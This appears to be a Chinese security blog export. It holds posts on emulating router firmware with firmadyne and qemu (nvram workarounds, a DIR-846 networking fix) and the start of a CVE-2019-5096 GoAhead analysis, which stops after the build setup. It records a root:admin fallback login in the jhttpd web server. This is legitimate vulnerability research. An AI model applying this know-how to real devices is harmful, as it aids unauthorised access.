0</span><br><span class="line">[   13.200000] $ 0   : 00000000 fffffffe 7f977018 7f977018</span><br><span class="line">[   13.200000] $ 4   : 7f977018 00000000 0000000b 00000000</span><br><span class="line">[   13.200000] $ 8   : 00000000 7f976f5b 00000008 8f820000</span><br><span class="line">[   13.200000] $12   : 8f821eb0 000007a0 00000000 00000008</span><br><span class="line">[   13.200000] $16   : 2aba0000 7f977481 7f977030 2ab701b4</span><br><span class="line">[   13.200000] $20   : 7f977018 7f97747a 2ab72920 2ab72920</span><br><span class="line">[   13.200000] $24   : 00000018 2aeeba10                  </span><br><span class="line">[   13.200000] $28   : 2ac08180 7f976ff0 0041a448 2ab20490</span><br><span class="line">[   13.200000] Hi    : 000001a5</span><br><span class="line">[   13.200000] Lo    : 00001396</span><br><span class="line">[   13.200000] epc   : 2aeeba24 0x2aeeba24</span><br><span class="line">[   13.200000]     Not tainted</span><br><span class="line">[   13.200000] ra    : 2ab20490 0x2ab20490</span><br><span class="line">[   13.200000] Status: 0000a413    USER EXL IE </span><br><span class="line">[   13.204000] Cause : 10800008</span><br><span class="line">[   13.204000] BadVA : 00000000</span><br><span class="line">[   13.204000] PrId  : 00019300 (MIPS 24Kc)</span><br><span class="line">[   13.208000] Kernel panic - not syncing: Attempted to kill init!</span><br></pre></td></tr></table></figure></div>

<p>显示出现错误，内核尝试 kill 掉 init 进程。熟悉 linux 的同学应该知道 init 是内核启动的第一个用户级别进程，是最基本的程序之一。连 init 进程都崩溃掉了，进入系统肯定无望。</p>
<p>增加 strace 选项之后简单梳理一下，崩溃的进程是 &#x2F;sbin&#x2F;rc，根目录中的 init 是它的符号链接。</p>
<p>init 进程尝试初始化 nvram 设置的时候会调用 libnvram.so 提供的接口，在此文件的 nvram_init 函数中试图访问 &#x2F;proc&#x2F;nvram 文件，猜测在原始内核初始化过程中会自动建立 &#x2F;proc&#x2F;nvram。</p>
<p>内核被我们替换了，自然不会自动创建 nvram 文件。这里最简单的想法就是手动创建一个空的 nvram 文件，先解决文件找不到的问题，至于其内容是否合法我们之后再谈。</p>
<p>不过又一个比较棘手的问题出现了，&#x2F;proc 目录下存储的并不是普通的文件，而是虚拟文件系统，这些文件和内核模块有关。firmadyne 提供的内核是已经编译好的，我们很难去手动增删模块，而且编写内核模块又是一个很繁琐的事情。有没有一个更简单的方法呢？</p>
<p>这里我想到两个解决方案，一是下载标准的 MIPS 镜像(例如 debian)，使用 qemu 的 system 模式启动，然后将固件的文件系统中的各个文件分别放在 qemu 系统的对应位置(例如 image&#x2F;lib &gt; &#x2F;lib)，再手动编写内核模块，创建 &#x2F;proc&#x2F;nvram ，之后尝试仿真。这种方法比较靠谱，但是操作及其麻烦。</p>
<p>二是在正常的虚拟机上解压镜像，在镜像的 &#x2F;proc 目录下创建一个普通文件 nvram，再用 chroot + qemu 的方式启动。</p>
<p>综合来看第二种方式比较简单，于是动手试了下(操作前一定要先拍摄快照！！！)</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">touch ./proc/nvram</span><br><span class="line">locate qemu-mips-static    找到静态编译的 qemu 二进制程序位置</span><br><span class="line">cp &lt;qemu-mips-static&gt; ./qemu</span><br><span class="line">sudo chroot . ./qemu ./init    启动 init 进程</span><br></pre></td></tr></table></figure></div>

<p>init 执行一段时间报错段错误，原先的找不到 nvram 错误已经消失。但这时候无论打开什么软件都没有响应，打开终端提示没有那个进程 QAQ。</p>
<p>不过还是有了意外收获，查看 &#x2F;proc&#x2F;nvram 文件发现里面已经填写了很多内容，一部分是标准的键值对格式，另外一部分类似于乱码，总归有了进展。</p>
<h2 id="固件分析"><a href="#固件分析" class="headerlink" title="固件分析"></a>固件分析</h2><p>firmadyne 模拟失败，qemu 模拟也失败，现在似乎没有什么头绪了。</p>
<p>这时候我决定先分析一下固件，先从 init 进程开始，init 是 &#x2F;sbin&#x2F;rc 的符号链接，所以把 rc 拷贝出来，丢进 ghidra 简单看一下。</p>
<p>一番查找找到了和 nvram 有关的部分代码，但是并没有访问 &#x2F;proc&#x2F;nvram 的迹象，查看导入函数发现绝大部分和 nvram 有关的函数来自 libnvram.so ，于是转而分析 libnvram.so。找到如下函数</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">nvram_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> *piVar1;</span><br><span class="line">  </span><br><span class="line">  _fdata = open(<span class="string">&quot;/proc/nvram&quot;</span>,<span class="number">2</span>);</span><br><span class="line">  <span class="keyword">if</span> (<span class="number">-1</span> &lt; _fdata) &#123;</span><br><span class="line">    DAT_0002fb00 = mmap((<span class="type">void</span> *)<span class="number">0x0</span>,<span class="number">0x100000</span>,<span class="number">1</span>,<span class="number">1</span>,_fdata,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (DAT_0002fb00 != (<span class="type">void</span> *)<span class="number">0xffffffff</span>) &#123;</span><br><span class="line">      fcntl(_fdata,<span class="number">2</span>,<span class="number">1</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;mmap errr&quot;</span>);</span><br><span class="line">    close(_fdata);</span><br><span class="line">    _fdata = <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  perror(<span class="string">&quot;/proc/nvram&quot;</span>);</span><br><span class="line">  piVar1 = __errno_location();</span><br><span class="line">  <span class="keyword">return</span> *piVar1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>原来是初始化过程中调用了 &#x2F;proc&#x2F;nvram 尝试读取相关配置，这时突然想到 firmadyne 提供了修改版的 libnvram.so ，能否直接替换过来解决问题呢？</p>
<p>再次用 firmadyne 模拟，不过解压固件之后手动替换 libnvram.so 。配置网络阶段依旧没有 IP。</p>
<p>查看日志发现和 nvram 有关的错误消失，不过多出来错误：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">/sbin/init: can&#x27;t resolve symbol &#x27;load_parameter</span><br></pre></td></tr></table></figure></div>

<p>由于我们替换了 libc，导致很多设备自己特有的函数丢失，运行依旧发生错误。</p>
<p>这里我想到2个解决方案：修改 firmadyne  提供的 libnvram.so 的代码，缺哪些 API 就增加上去。不过此方法工作量很大，而且需要一点点分析整个程序的逻辑。</p>
<p>第二个比较取巧，既然找不到 &#x2F;proc 下的文件，我们又不能直接创建文件，那么可以尝试将访问 &#x2F;proc&#x2F;nvram 修改成访问 &#x2F;test&#x2F;nvram。</p>
<p>用 IDA patch libnvram.so（原版的），再用 firmadyne 模拟。</p>
<p>很遗憾，这样操作还是存在问题。查看日志提示无法访问 &#x2F;proc&#x2F;mtd。我简单看了一下，这个固件要访问的 &#x2F;proc 文件很多，一个个去手动 patch 很麻烦，而且就算 patch 成功，也有很多配置的缺失，正常模拟的概率很低。(我按照报错信息 patch 了 mtd，但是和 nvram 不同，依旧报错，猜测是配置丢失或错误导致的)</p>
<p>通过查看用户手册，发现这款设备存在 web 管理界面，既然能通过 web 访问，肯定有和 http 相关的程序，在目录中搜索 http，发现一个名为 jhttpd 的程序，应该是自己实现的 web 服务器。</p>
<p>另外没有发现类似 html、js 等静态文件，猜测所有 web 处理逻辑全都集中在 jhttpd 中。</p>
<p>那么单独模拟 jhttpd 这个程序，是否就能看到 web 管理界面呢？</p>
<p>模拟单个程序非常简单，使用命令</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">qemu-mips -L . ./usr/sbin/jhttpd</span><br></pre></td></tr></table></figure></div>

<p>执行起来提示找不到 nvram，按照上面的操作自己建立一个，再次执行，没出现任何报错信息。尝试用浏览器访问：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/firmware1.png"
                     
                ></p>
<p>这样可以成功模拟设备的 web 服务。</p>
<p>按照用户手册提示的账户(admin:admin)登录，提示用户名或密码错误。</p>
<p>我逆向分析了一下 jhttpd 程序，发现他会尝试去 nvram 读取配置，其中包含账号和密码，nvram 中默认的是 admin:admin，但是我们自己创建的 nvram 并不包含这些配置，所以无法正常登录。</p>
<p>当 jhttpd 检测到无法读取用户名和密码时，会设置默认的用户名为 root，密码为 admin，尝试登陆成功。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/firmware2.png"
                     
                ></p>
<p>不过，这种模拟方式还存在很多问题，我们现在只能看到 web 界面，并使用很少的一部分功能，大部分功能在发送请求之后会导致 jhttpd 崩溃，经过一番排查发现大部分错误发生在调用某 libc 函数时，例如 ping 功能会调用 fork 函数执行命令，不过 qemu 单独模拟的环境执行 fork 将失败。配置 wifi 的请求会调用某脚本，而模拟环境下脚本不能正常执行，进而整个进程会崩溃。</p>
]]></content>
      <categories>
        <category>MISC</category>
      </categories>
  </entry>
  <entry>
    <title>固件模拟 Case Study (1)</title>
    <url>/2020/01/08/firmadyne1/</url>
    <content><![CDATA[<p>当分析物联网设备固件时，为了验证漏洞是否存在，可能需要对固件进行模拟，目前对于固件模拟比较好的开源解决方案是 firmadyne，但在实际使用 firmadyne 的过程中会遇到很多问题，这篇文章简单总结一下使用 firmadyne 可能会遇到的问题，以及部分解决方案。</p>
<span id="more"></span>

<h2 id="关于-firmadyne-的原理"><a href="#关于-firmadyne-的原理" class="headerlink" title="关于 firmadyne 的原理"></a>关于 firmadyne 的原理</h2><p>firmadyne 有一篇<a class="link"   href="https://github.com/firmadyne/firmadyne/blob/master/paper/paper.pdf" >相关论文<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>，主要作者来自 CMU，这篇论文详细介绍了 firmadyne 的实现思路和部分原理，推荐详细阅读一下，我在这里只做简单介绍。</p>
<p>整个框架有 4 部分组件：</p>
<ol>
<li>爬虫组件：从各大厂商特定的固件服务器上面爬取不同设备、不同版本的固件，并下载到本地存储。</li>
<li>解压组件：通常固件会经过某种手段压缩为镜像格式文件，此组件主要用于将镜像还原为标准的文件系统。</li>
<li>模拟组件：利用 qemu 模拟成功还原的固件，构造合适的虚拟硬件环境以支持固件运行。</li>
<li>动态分析组件：利用已知的 poc 或 fuzz 等技术对成功模拟的固件进行安全测试，将发现的漏洞等存档。</li>
</ol>
<p>我们在实际分析过程中常用的是第二和第三个组件。</p>
<p>解压组件主要用到的还是 binwalk 的 api，但是作者人为的对解压策略进行了限制和优化。</p>
<p>在最主要的模拟组件中，作者提到了一个关键问题：对 NVRAM 的支持。大部分路由器、交换机等类似设备硬件上都有一片称为 nvram 的存储芯片，其内部保存了一些重要配置信息，当设备启动的时候，系统会尝试从 nvram 中读取这些信息。</p>
<p>然而 QEMU 所提供的虚拟化环境默认并不包括这一硬件设备，所以我们用 qemu + chroot 等手段启动固件的时候经常会看到有关于 nvram 缺失的提示信息。</p>
<p>firmadyne 自己实现了一个 libnvram.so 库文件，里面模拟了很多和访问 nvram 有关的 API，通过代码直接限制程序读取 nvram 的行为，这样一来就可以达到“欺骗“固件的目的。</p>
<p>另外一个关键问题是网络的配置，成功生成一个固件镜像之后，firmadyne 会启动这个镜像，持续约 60 秒，作者称之为”学习阶段“，在此阶段，框架会分析镜像启动过程中留下的日志文件，在里面获取和网卡、vlan、网路配置有关的信息，之后利用 qemu 的 TAP 模式，在宿主机创建虚拟网卡，然后指定给 qemu 用于主机和虚拟机之间的通信。</p>
<p>不过这个模拟网络的策略存在一些问题，我们后文再说。</p>
<h2 id="firmadyne-的安装"><a href="#firmadyne-的安装" class="headerlink" title="firmadyne 的安装"></a>firmadyne 的安装</h2><p>firmadyne 项目历史比较悠久了，在 github 上面看到某些文件的 commit 在 4 年前，加上作者在 issue 中提到自己的时间比较少，未来不会投入大量精力维护这个项目，导致目前 firmadyne 和其依赖软件(比如 qemu、binwalk 等)之间存在各种兼容性问题，在安装的时候要格外注意。</p>
<p>安装的具体教程在百度和 github 都有详细的介绍，这里不再赘述，只提一下需要注意的要点。</p>
<ol>
<li>关于安装系统：推荐 Ubuntu 14.04，这也是作者推荐的版本，考虑到此项目时间久远，在新的系统上面可能会出现各种兼容问题。</li>
<li>关于 QEMU：最好不要从源代码编译，另外不要使用最新版本，用 apt 安装即可，原因是 firmadyne 中在启动镜像阶段会用到某些和 vlan 有关的启动参数，这些参数在 QEMU 3.0 版本中已经移除，并且新版存在很多 API 上的变化，很可能出现模拟不成功、参数错误等棘手的问题。</li>
<li>关于 binwalk：按照提示安装好之后，最好找一个固件测试一下(github 给出的测试固件即可)，因为 binwalk 在解压固件的时候会依赖某些插件(比如 python-LZMA)，当插件缺失的时候解压将失败。</li>
<li>关于数据库：严格按照提示的配置步骤来，特别注意密码是否正确(firmadyne)。</li>
<li>别忘了安装完成还需要手动修改 config 文件头部的路径。</li>
<li><strong>使用 git clone 直接克隆仓库代码，不要使用旧版本的代码。</strong></li>
</ol>
<p>另外有一个名为 FAT 的项目可用于简化 firmadyne 操作。</p>
<h2 id="可能遇到的问题以及一些注意事项"><a href="#可能遇到的问题以及一些注意事项" class="headerlink" title="可能遇到的问题以及一些注意事项"></a>可能遇到的问题以及一些注意事项</h2><p>配置文件问题，firmadyne 安装完成，初次使用的时候需要修改 config 配置，忘记修改会出现变量未定义的错误。</p>
<p>密码问题，数据库默认密码为 firmadyne，如果配置的时候不小心输入错误会导致后续操作出现异常。</p>
<p>依赖组件版本问题，前面提到 firmadyne 对各依赖工具存在版本限制，在安装过程中尽量按照 GitHub 提示进行，不要自己选择版本。</p>
<p>网络问题，在配置网络这一步会出现很多异常情况，首先要排查这种异常是不是由其他软件造成的，推荐将 firmadyne 安装在新的虚拟机系统上面，防止软件之间产生冲突。检查当前版本是否最新，虽然作者不愿意对框架进行大幅度的改进，但是对于某些小问题还是做出了修补。</p>
<p>如果重新安装框架问题还是得不到解决，那么很可能是该固件内部存在某些特殊操作，firmadyne 毕竟是一款通用框架，对于一小部分”不走寻常路“的固件可能需要我们自己分析异常，进行修改。</p>
<p>除上面提到的，在 GitHub 的 issue 包括了很多大神的讨论，一般来说我们遇到的问题都可以在 issue 上面找到答案。</p>
<h2 id="AttifyOS"><a href="#AttifyOS" class="headerlink" title="AttifyOS"></a>AttifyOS</h2><p>github 上能找到这个虚拟机的下载地址 <a class="link"   href="https://github.com/adi0x90/attifyos" >https://github.com/adi0x90/attifyos<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>说白了，它就是包含了一些分析工具的虚拟机，大神已经安装测试完毕，我们下载即可使用。attifyos 内置了 firmadyne，并且已经配置了 FAT，最简单的使用方式：把镜像拷贝到虚拟机，然后 python FAT.py &lt;镜像名字&gt; 即可。</p>
<p>如果你不想手动安装工具的话，可以直接下载 attifyos。但虚拟机里面的工具版本比较低，模拟时会出现很多问题，我个人推荐先把 firmadyne <strong>更新到新版</strong>。</p>
<h2 id="固件模拟实例"><a href="#固件模拟实例" class="headerlink" title="固件模拟实例"></a>固件模拟实例</h2><p>这里我记录一下最近分析的一款路由器固件 DIR-846 的模拟过程。</p>
<p>固件可以在 dlink 官网下载到，先用 binwalk 看一下固件的内容:</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/firmadyne-1.png"
                     
                ></p>
<p>很标准的格式，直接用 binwalk -Me 即可解压出来。</p>
<p>那么可以直接丢进 firmadyne 尝试模拟，如果你是新安装的系统和工具，先拍摄一个快照，命名为原始快照。</p>
<p>镜像丢到 firmadyne 目录下，执行命令解压固件</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">./sources/extractor/extractor.py -b Dlink -sql 127.0.0.1 -np -nk &quot;DIR846A1_FW100A35.bin&quot; images</span><br></pre></td></tr></table></figure></div>

<p>此时你可以在 image 目录下找到刚刚生成的 1.tar.gz，请修改压缩包内的 &#x2F;etc&#x2F;shadow 文件，替换 root 密码为你知道的密码(例如从自己的机器上拷贝一份)。</p>
<p>执行命令识别固件架构</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">./scripts/getArch.sh ./images/1.tar.gz</span><br></pre></td></tr></table></figure></div>

<p>然后创建数据库</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">./scripts/tar2db.py -i 1 -f ./images/1.tar.gz</span><br></pre></td></tr></table></figure></div>

<p>制作镜像</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo ./scripts/makeImage.sh 1</span><br></pre></td></tr></table></figure></div>

<p>配置网络</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">./scripts/inferNetwork.sh 1</span><br></pre></td></tr></table></figure></div>

<p>此时我遇到了问题：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Warning: Unmatched interface: ([&#x27;br-lan&#x27;,192.168.0.1,null,null])</span><br></pre></td></tr></table></figure></div>

<p>继续向下执行</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">./scratch/1/run.sh</span><br></pre></td></tr></table></figure></div>

<p>系统能正常跑起来，但是经过测试发现没办法访问到虚拟机内的路由器管理页面。</p>
<p>我在网上找了很多文章，但是都没解决问题，起初怀疑是 firmadyne 安装有问题，使用官方提供的例子固件再次测试发现并不报错，进入系统之后利用 ifconfig 查看网卡结构发现 DIR-846 固件只开启了 br-lan 网卡接口。</p>
<p>百度一下我找到了文章 <a class="link"   href="https://blog.csdn.net/ai2000ai/article/details/79077506%EF%BC%8C%E6%96%87%E7%AB%A0%E7%AE%80%E5%8D%95%E4%BB%8B%E7%BB%8D%E4%BA%86%E5%90%84%E4%B8%AA%E7%BD%91%E5%8D%A1%E7%9A%84%E5%9F%BA%E6%9C%AC%E5%90%AB%E4%B9%89%EF%BC%8C%E5%85%B6%E4%B8%AD%E7%9A%84%E4%B8%80%E5%BC%A0%E5%9B%BE%E7%89%87%E5%BE%88%E6%A3%92%EF%BC%9A" >https://blog.csdn.net/ai2000ai/article/details/79077506，文章简单介绍了各个网卡的基本含义，其中的一张图片很棒：<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/firmadyne-2.png"
                     
                ></p>
<p>这个是华硕很早的一款网络设备，采用 openwrt 的 SoC。</p>
<p>目前市面上多数路由器网卡结构和上图类似，eth0 是实际的物理网卡，其向下会分别虚拟出 lan 口和 wan 口，另外无线部分也很会区分 2.4G 和 5G 等等。</p>
<p>br-lan 是虚拟设备，用于 LAN 口的桥接。简而言之，我们的 846 固件默认只开启了一个虚拟接口(br-lan)，甚至连环回接口都没有开启，协议栈并没有正常工作。</p>
<p>找到问题的原因了，尝试手动开启各个网络接口并分配 IP 地址。再次访问还是不行。</p>
<p>又查找了一些资料，发现可能是 firmadyne 的网络配置策略出现问题，在它自动生成的脚本 run.sh 中会创建 tap 虚拟网卡并创建通往 QEMU 虚拟机的路由，但由于固件内部并没有自动启用网卡，这条路由无效，就算手动配置也无济于事。</p>
<p>于是 修改 run.sh 脚本</p>
<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">set -u</span><br><span class="line"></span><br><span class="line">ARCHEND=mipsel</span><br><span class="line">IID=1</span><br><span class="line"></span><br><span class="line">if [ -e ./firmadyne.config ]; then</span><br><span class="line">    source ./firmadyne.config</span><br><span class="line">elif [ -e ../firmadyne.config ]; then</span><br><span class="line">    source ../firmadyne.config</span><br><span class="line">elif [ -e ../../firmadyne.config ]; then</span><br><span class="line">    source ../../firmadyne.config</span><br><span class="line">else</span><br><span class="line">    echo &quot;Error: Could not find &#x27;firmadyne.config&#x27;!&quot;</span><br><span class="line">    exit 1</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">IMAGE=`get_fs $&#123;IID&#125;`</span><br><span class="line">KERNEL=`get_kernel $&#123;ARCHEND&#125;`</span><br><span class="line">QEMU=`get_qemu $&#123;ARCHEND&#125;`</span><br><span class="line">QEMU_MACHINE=`get_qemu_machine $&#123;ARCHEND&#125;`</span><br><span class="line">QEMU_ROOTFS=`get_qemu_disk $&#123;ARCHEND&#125;`</span><br><span class="line">WORK_DIR=`get_scratch $&#123;IID&#125;`</span><br><span class="line"></span><br><span class="line">trap cleanup EXIT</span><br><span class="line"></span><br><span class="line">echo &quot;Starting firmware emulation... use Ctrl-a + x to exit&quot;</span><br><span class="line">sleep 1s</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"> $</span><span class="language-bash">&#123;QEMU&#125; -m 256 -M <span class="variable">$&#123;QEMU_MACHINE&#125;</span> -kernel <span class="variable">$&#123;KERNEL&#125;</span> \</span></span><br><span class="line"><span class="language-bash">    -drive <span class="keyword">if</span>=ide,format=raw,file=<span class="variable">$&#123;IMAGE&#125;</span> -append <span class="string">&quot;root=<span class="variable">$&#123;QEMU_ROOTFS&#125;</span> console=ttyS0 nandsim.parts=64,64,64,64,64,64,64,64,64,64 rdinit=/firmadyne/preInit.sh rw debug ignore_loglevel print-fatal-signals=1 user_debug=31 firmadyne.syscall=0&quot;</span> \</span></span><br><span class="line"><span class="language-bash">    -nographic \</span></span><br><span class="line"><span class="language-bash">    -net nic -net tap,ifname=tap0,script=no,downscript=no | <span class="built_in">tee</span> <span class="variable">$&#123;WORK_DIR&#125;</span>/qemu.final.serial.log</span></span><br></pre></td></tr></table></figure></div>

<p>结合之前写的 QEMU 网络配置手动创建 tap 虚拟网卡并通过网桥的方式接入 QEMU 虚拟机，然后在虚拟机中手动启用 eth0 等网卡并分配 IP 地址。</p>
<p>此时虚拟机中网卡如下:</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/firmadyne-3.png"
                     
                ></p>
<p>本机网卡状态</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">br0       Link encap:Ethernet  HWaddr 00:0c:29:90:94:18  </span><br><span class="line">          inet addr:192.168.166.138  Bcast:192.168.166.255  Mask:255.255.255.0</span><br><span class="line">          inet6 addr: fe80::20c:29ff:fe90:9418/64 Scope:Link</span><br><span class="line">          UP BROADCAST RUNNING PROMISC MULTICAST  MTU:1500  Metric:1</span><br><span class="line">          RX packets:43207 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:2301 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:1000 </span><br><span class="line">          RX bytes:12217527 (12.2 MB)  TX bytes:310242 (310.2 KB)</span><br><span class="line"></span><br><span class="line">eth0      Link encap:Ethernet  HWaddr 00:0c:29:90:94:18  </span><br><span class="line">          inet addr:192.168.166.139  Bcast:192.168.166.255  Mask:255.255.255.0</span><br><span class="line">          inet6 addr: fe80::20c:29ff:fe90:9418/64 Scope:Link</span><br><span class="line">          UP BROADCAST RUNNING PROMISC MULTICAST  MTU:1500  Metric:1</span><br><span class="line">          RX packets:286100 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:71492 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:1000 </span><br><span class="line">          RX bytes:369617544 (369.6 MB)  TX bytes:10566787 (10.5 MB)</span><br><span class="line"></span><br><span class="line">lo        Link encap:Local Loopback  </span><br><span class="line">          inet addr:127.0.0.1  Mask:255.0.0.0</span><br><span class="line">          inet6 addr: ::1/128 Scope:Host</span><br><span class="line">          UP LOOPBACK RUNNING  MTU:65536  Metric:1</span><br><span class="line">          RX packets:15207 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:15207 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:1 </span><br><span class="line">          RX bytes:3129532 (3.1 MB)  TX bytes:3129532 (3.1 MB)</span><br><span class="line"></span><br><span class="line">tap0      Link encap:Ethernet  HWaddr 32:4e:1d:e9:33:5a  </span><br><span class="line">          inet6 addr: fe80::304e:1dff:fee9:335a/64 Scope:Link</span><br><span class="line">          UP BROADCAST RUNNING PROMISC MULTICAST  MTU:1500  Metric:1</span><br><span class="line">          RX packets:22279 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:20531 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:1000 </span><br><span class="line">          RX bytes:11080451 (11.0 MB)  TX bytes:1821983 (1.8 MB)</span><br></pre></td></tr></table></figure></div>

<p>到这里我们就可以成功访问 web 管理界面：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/firmadyne-4.png"
                     
                ></p>
]]></content>
      <categories>
        <category>MISC</category>
      </categories>
  </entry>
  <entry>
    <title>CVE-2019-5096</title>
    <url>/2019/12/23/CVE-2019-5096/</url>
    <content><![CDATA[<p>好久没写博客了，一直在忙考试之类的事情，这个月初（2019-12-02） Cisco 的安全专家披露了 GoAhead 开源 web 服务中存在两个漏洞，CVE 编号 5096 和 5097，5096 是一枚 UAF 漏洞（号称能够达到 RCE），5097 是一枚 DDoS 漏洞。我们简单分析一下 5096.</p>
<span id="more"></span>

<h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><ol>
<li>首先去 GitHub clone 下来 GoAhead 的源代码</li>
</ol>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/embedthis/goahead</span><br></pre></td></tr></table></figure></div>

<ol start="2">
<li>查找最近的更新版本信息</li>
</ol>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">git log --pretty=oneline</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/CVE-2019-5096-1.png"
                     
                ></p>
<ol start="3">
<li>和此漏洞有关的是 FIX Issue #287，那么我们选择签出其之前的一个版本</li>
</ol>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">git checkout f42afd767f90358908f5ef46b4e5bee8803d5ac5</span><br></pre></td></tr></table></figure></div>

<ol start="4">
<li>修改源代码，打开 osdep.c 文件，将函数 websTempFile 修改为</li>
</ol>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">PUBLIC <span class="type">char</span> *<span class="title function_">websTempFile</span><span class="params">(cchar *dir, cchar *prefix)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span>   sep;</span><br><span class="line"></span><br><span class="line">    sep = <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> (!dir || *dir == <span class="string">&#x27;\0&#x27;</span>) &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> WINCE</span></span><br><span class="line">        dir = <span class="string">&quot;/Temp&quot;</span>;</span><br><span class="line">        sep = <span class="string">&#x27;\\&#x27;</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">elif</span> ME_WIN_LIKE</span></span><br><span class="line">        dir = getenv(<span class="string">&quot;TEMP&quot;</span>);</span><br><span class="line">        sep = <span class="string">&#x27;\\&#x27;</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">elif</span> VXWORKS</span></span><br><span class="line">        dir = <span class="string">&quot;.&quot;</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">        dir = <span class="string">&quot;/tmp&quot;</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!prefix) &#123;</span><br><span class="line">        prefix = <span class="string">&quot;tmp&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sfmt(<span class="string">&quot;/tmp%c%s-%d.tmp&quot;</span>, sep, prefix, count++);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ol start="5">
<li>编译程序，用 VSCode 打开 src 文件夹准备分析。</li>
</ol>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>编译好的二进制文件在 build 目录下，我们首先分析一下源代码的大致逻辑。</p>
<p><em>PS：VSCode 安装了 C&#x2F;C++ 插件的话可以很方便的查找函数和变量的交叉引用</em></p>
<p>根据<a class="link"   href="https://talosintelligence.com/vulnerability_reports/TALOS-2019-0888" >披露信息<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>，漏洞发生的位置是 freeUploadFile 函数，在文章中还给出了相关的崩溃信息：</p>
